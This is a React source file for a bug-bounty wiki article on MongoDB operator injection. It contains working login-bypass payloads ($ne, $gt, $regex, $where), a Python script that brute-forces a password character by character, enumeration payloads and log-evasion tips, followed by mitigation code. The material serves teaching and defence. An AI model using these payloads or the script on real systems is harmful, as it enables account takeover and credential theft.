/**
 * MONGODB OPERATOR INJECTION
 * Complete content extracted from original page.tsx (English version)
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Database, Lock, Code2, Zap, ArrowRight, Shield } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function MongodbInjectionContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      {/* Introduction */}
      <Section id="introduction" title="What is NoSQL Injection?">
        <Paragraph>
          Unlike SQL, <Strong>NoSQL databases like MongoDB</Strong> don't use text-format queries. 
          Instead, they use <Strong>JavaScript/JSON objects</Strong> that can be manipulated to alter 
          query logic.
        </Paragraph>

        <AlertInfo title="Key Difference from SQL Injection">
          <ul className="space-y-2 mt-2">
            <ListItem>
              <Strong>SQL:</Strong> You inject strings like <InlineCode>' OR '1'='1</InlineCode>
            </ListItem>
            <ListItem>
              <Strong>NoSQL:</Strong> You inject objects like <InlineCode>{`{"$ne": null}`}</InlineCode>
            </ListItem>
          </ul>
        </AlertInfo>

        <Paragraph className="mt-4">
          Many developers believe that using MongoDB makes them "protected" from injection, but this is a 
          <span className="font-semibold text-red-600 dark:text-red-400"> dangerous myth</span>.
        </Paragraph>
      </Section>

      {/* Login Bypass */}
      <Section id="login-bypass" title="1. Login Bypass with Operators">
        
        <Subsection title="Vulnerable Scenario">
          <Paragraph>
            An API that receives credentials in JSON and passes them directly to MongoDB:
          </Paragraph>

          <CodeBlock
            language="javascript"
            title="❌ Vulnerable code (Node.js + Express)"
            code={`// Vulnerable API endpoint
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // ❌ DANGER: Passes user input directly
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
  
  if (user) {
    res.json({ success: true, token: generateToken(user) });
  } else {
    res.json({ success: false });
  }
});`}
          />

          <AlertDanger title="Why is it vulnerable?">
            If the attacker sends an <Strong>object instead of a string</Strong>, they can manipulate 
            the MongoDB query using its special operators.
          </AlertDanger>
        </Subsection>

        <Subsection title="Attack Payload: $ne Operator (Not Equal)">
          <Paragraph>
            Instead of sending normal strings, we send objects with MongoDB operators:
          </Paragraph>

          <CodeBlock
            language="json"
            title="Payload - Login bypass with $ne"
            code={`// Normal request (legitimate)
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": "secretpass123"
}

// Malicious request (attack)
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": {"$ne": null}
}`}
          />

          <HighlightBox color="red" title="🔓 How does it work?" icon={<Lock className="w-6 h-6 text-red-600 dark:text-red-400" />}>
            <Paragraph className="mb-3">
              The payload <InlineCode>{`{"$ne": null}`}</InlineCode> translates to:
            </Paragraph>
            <CodeBlock
              language="javascript"
              code={`// Resulting MongoDB query
db.collection('users').findOne({
  username: "admin",
  password: { $ne: null }  // ← "password NOT EQUAL to null"
});

// This means: "Give me user 'admin' whose password is NOT null"
// And virtually ALL passwords meet that condition!`}
            />
            <Paragraph className="mt-3">
              <span className="font-semibold text-red-700 dark:text-red-300">Result:</span> Successful login without knowing the actual password.
            </Paragraph>
          </HighlightBox>
        </Subsection>

        <Subsection title="Other Useful Operators for Bypass">
          <CodeBlock
            language="json"
            title="Payload variants"
            code={`// $gt (greater than)
{
  "username": "admin",
  "password": {"$gt": ""}
}

// $regex - Regular expression that matches everything
{
  "username": "admin",
  "password": {"$regex": ".*"}
}

// $in - Password is in an array (always true)
{
  "username": "admin",
  "password": {"$in": ["admin", "password", "123456", "", null]}
}

// $exists - Password field exists
{
  "username": "admin",
  "password": {"$exists": true}
}`}
          />

          <AlertTip title="Stealthier payload">
            The <InlineCode>$gt with empty string</InlineCode> operator is less suspicious in logs than <InlineCode>$ne null</InlineCode>, 
            because it looks like a "normal" comparison.
          </AlertTip>
        </Subsection>
      </Section>

      {/* Data Exfiltration */}
      <Section id="exfiltration" title="2. Data Extraction with $regex">
        
        <Subsection title="Scenario: Exfiltrate Passwords Character by Character">
          <Paragraph>
            Using <Strong>regular expressions</Strong>, we can extract data bit by bit, 
            similar to Time-blind SQL Injection but based on boolean responses.
          </Paragraph>

          <CodeBlock
            language="json"
            title="Payload - Detect first character of password"
            code={`// Does admin's password start with 'a'?
{
  "username": "admin",
  "password": {"$regex": "^a"}
}

// Does it start with 'b'?
{
  "username": "admin",
  "password": {"$regex": "^b"}
}

// ... Continue until finding the correct character`}
          />

          <TerminalOutput title="Server responses">
            {`// If password starts with 'a'
{"success": false}  ← No match

// If password starts with 'p'
{"success": true}   ← Match! First char is 'p'`}
          </TerminalOutput>
        </Subsection>

        <Subsection title="Automation Script (Python)">
          <CodeBlock
            language="python"
            title="mongodb_password_exfiltration.py"
            code={`import requests
import string

URL = "https://target.com/api/login"
CHARSET = string.ascii_lowercase + string.digits + "_@.-!#$%"
PASSWORD = ""

print("[+] Starting password extraction for user 'admin'...")

# Extract each character
while True:
    found = False
    
    for char in CHARSET:
        # Build regex to test next character
        regex = f"^{PASSWORD}{char}"
        
        payload = {
            "username": "admin",
            "password": {"$regex": regex}
        }
        
        r = requests.post(URL, json=payload)
        
        # If login successful, we found the character
        if r.json().get("success"):
            PASSWORD += char
            print(f"[+] Char found: {char} → Current password: {PASSWORD}")
            found = True
            break
    
    # If no more characters found, we're done
    if not found:
        break

print(f"\\n[✓] Complete password extracted: {PASSWORD}")`}
          />

          <AlertInfo title="Optimization: Case-insensitive regex">
            Use the <InlineCode>$options</InlineCode> operator with value <InlineCode>i</InlineCode> to make the search 
            case-insensitive and speed up the process.
          </AlertInfo>
        </Subsection>

        <Subsection title="Extracting Multiple Users">
          <CodeBlock
            language="json"
            title="Payload - Enumerate users with $regex"
            code={`// Users starting with 'a'
{
  "username": {"$regex": "^a"},
  "password": {"$ne": null}
}

// Exact 5-character usernames
{
  "username": {"$regex": "^.{5}$"},
  "password": {"$ne": null}
}

// Users containing 'admin'
{
  "username": {"$regex": "admin", "$options": "i"},
  "password": {"$ne": null}
}`}
          />
        </Subsection>
      </Section>

      {/* Advanced Operators */}
      <Section id="advanced-operators" title="3. Advanced Operators">
        
        <Subsection title="$where - JavaScript Injection">
          <Paragraph>
            The <InlineCode>$where</InlineCode> operator allows executing <Strong>arbitrary JavaScript code</Strong> 
            in the MongoDB server context. Extremely dangerous if not filtered.
          </Paragraph>

          <CodeBlock
            language="json"
            title="Payload - $where injection"
            code={`// Login bypass with JavaScript code
{
  "username": "admin",
  "$where": "return true"
}

// Extract password character by character
{
  "username": "admin",
  "$where": "this.password.substring(0,1) == 'p'"
}

// Sleep-based (Time-blind NoSQL)
{
  "username": "admin",
  "$where": "sleep(5000) || true"
}`}
          />

          <AlertDanger title="Critical impact">
            With <InlineCode>$where</InlineCode> you can:
            <ul className="mt-2 space-y-1">
              <ListItem>Execute arbitrary JavaScript on server</ListItem>
              <ListItem>Access <InlineCode>this</InlineCode> (current document)</ListItem>
              <ListItem>Cause DoS with infinite loops</ListItem>
              <ListItem>Exfiltrate sensitive data</ListItem>
            </ul>
          </AlertDanger>
        </Subsection>

        <Subsection title="$lookup - Server-Side Join Injection">
          <CodeBlock
            language="json"
            title="Payload - Join data from other collections"
            code={`// Try to join with 'admin_keys' collection
{
  "$lookup": {
    "from": "admin_keys",
    "localField": "_id",
    "foreignField": "user_id",
    "as": "secrets"
  }
}`}
          />
        </Subsection>

        <Subsection title="$expr - Complex Comparisons">
          <CodeBlock
            language="json"
            title="Payload - Conditional expressions"
            code={`// Bypass when username == password
{
  "$expr": {
    "$eq": ["$username", "$password"]
  }
}

// Detect documents with specific fields
{
  "$expr": {
    "$gt": [{"$strLenCP": "$password"}, 10]
  }
}`}
          />
        </Subsection>
      </Section>

      {/* Bypass Protections */}
      <Section id="bypass" title="4. Bypassing Common Validations">
        
        <Subsection title="Type Checking Bypass">
          <Paragraph>
            Some developers validate "if it's a string", but forget to validate nested objects:
          </Paragraph>

          <CodeBlock
            language="javascript"
            title="❌ Insufficient validation"
            code={`// Validation attempt (INSUFFICIENT)
if (typeof username === 'string' && typeof password === 'string') {
  const user = await db.collection('users').findOne({
    username: username,
    password: password
  });
}

// ❌ Problem: Doesn't validate OBJECTS like {"$ne": null}`}
          />

          <CodeBlock
            language="json"
            title="Payload that bypasses this validation"
            code={`// Nested object injection
{
  "username": "admin",
  "password": {
    "$ne": null
  }
}

// The typeof password will be 'object', but some frameworks
// automatically convert it before the check`}
          />
        </Subsection>

        <Subsection title="Bypass via URL Parameters">
          <CodeBlock
            language="http"
            title="Payload - Query string injection"
            code={`GET /api/login?username=admin&password[$ne]=null HTTP/1.1

// Some frameworks parse this as:
{
  "username": "admin",
  "password": {
    "$ne": null
  }
}`}
          />

          <AlertTip title="Vulnerable frameworks">
            Express.js with <InlineCode>qs</InlineCode> library (default) parses 
            <InlineCode>password[$ne]=null</InlineCode> as an object.
          </AlertTip>
        </Subsection>
      </Section>

      {/* Mitigation */}
      <Section id="mitigation" title="Mitigation for Developers">
        <AlertDanger title="How to prevent NoSQL Injection">
          <ul className="space-y-3 mt-3">
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Input Sanitization:</Strong> Reject objects, only accept primitive strings/numbers
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Whitelist Validation:</Strong> Validate that inputs don't contain $ characters (operators)
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Strict Type Checking:</Strong> Verify types recursively in nested objects
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Disable $where:</Strong> Configure MongoDB to block $where operator
            </ListItem>
            <ListItem icon={<Shield className="w-5 h-5 text-green-600 dark:text-green-400" />}>
              <Strong>Hash Passwords:</Strong> NEVER compare passwords in plaintext, use bcrypt/argon2
            </ListItem>
          </ul>
        </AlertDanger>

        <CodeBlock
          language="javascript"
          title="✅ Secure code with sanitization"
          code={`const validator = require('validator');

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  
  // ✅ Validate they are primitive strings
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input type' });
  }
  
  // ✅ Reject $ characters (MongoDB operators)
  if (username.includes('$') || password.includes('$')) {
    return res.status(400).json({ error: 'Invalid characters' });
  }
  
  // ✅ Validate format (optional but recommended)
  if (!validator.isAlphanumeric(username)) {
    return res.status(400).json({ error: 'Invalid username format' });
  }
  
  // ✅ Compare with hash, NOT plaintext
  const user = await db.collection('users').findOne({ username });
  
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    res.json({ success: true, token: generateToken(user) });
  } else {
    res.json({ success: false });
  }
});`}
        />

        <CodeBlock
          language="javascript"
          title="✅ Reusable sanitization helper"
          code={`// Helper to sanitize MongoDB inputs
function sanitizeMongoInput(obj) {
  if (typeof obj !== 'object' || obj === null) {
    return obj;
  }
  
  const sanitized = {};
  
  for (const [key, value] of Object.entries(obj)) {
    // Reject keys starting with $ (operators)
    if (key.startsWith('$')) {
      throw new Error(\`Invalid key: \${key}\`);
    }
    
    // Sanitize recursively
    if (typeof value === 'object' && value !== null) {
      sanitized[key] = sanitizeMongoInput(value);
    } else {
      sanitized[key] = value;
    }
  }
  
  return sanitized;
}

// Usage
app.post('/api/data', async (req, res) => {
  try {
    const sanitized = sanitizeMongoInput(req.body);
    const result = await db.collection('data').find(sanitized).toArray();
    res.json(result);
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});`}
        />
      </Section>

      {/* Next Step */}
      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: Redis RCE</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/redis-rce`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-red-600 to-pink-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-red-500/50 transition-all"
        >
          <span>Redis RCE via Lua Sandboxing</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
